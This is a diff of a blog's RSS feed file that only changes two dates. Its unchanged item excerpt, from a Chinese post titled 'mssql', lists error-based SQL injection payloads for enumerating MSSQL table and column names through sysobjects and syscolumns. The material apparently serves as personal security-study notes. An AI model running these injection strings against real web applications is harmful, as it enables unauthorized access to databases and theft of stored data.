@@ -8,11 +8,11 @@
     <language>en</language>
     <copyright>&amp;copy; 2021 &lt;a href=&#34;https://www.wangchucheng.com/&#34;&gt;C. Wang&lt;/a&gt; and &lt;a href=&#34;https://www.ruiqima.com/&#34;&gt;R. Ma&lt;/a&gt;
 </copyright>
-    <lastBuildDate>Sun, 10 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/categories/web/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 12 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/categories/web/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>mssql</title>
       <link>/posts/mssql/</link>
-      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
+      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
       
       <guid>/posts/mssql/</guid>
       <description>爆表名 1 2 3 4  &amp;#39; and 1=(select top 1 name from sysobjects where xtype=&amp;#39;u&amp;#39; and name !=&amp;#39;info&amp;#39;);-- 没当爆出来一个表名需要添加!= 之前的表名 and 1=(select top 1 name from sysobjects where xtype=&amp;#39;u&amp;#39; and name !=&amp;#39;info&amp;#39; and name != &amp;#39;new&amp;#39;);   1  selecttop1namefrom(selecttop2namefromsysobjectswherextype=0x75orderbyname)torderbynamedesc  爆字段名 1 2 3 4  &amp;#39; and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &amp;#39;admin&amp;#39;) and name&amp;lt;&amp;gt;&amp;#39;id&amp;#39;);-- 也是一样的爆出来一个 去!=一个 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &amp;#39;admin&amp;#39;) and name&amp;lt;&amp;gt;&amp;#39;id&amp;#39; and name !</description>
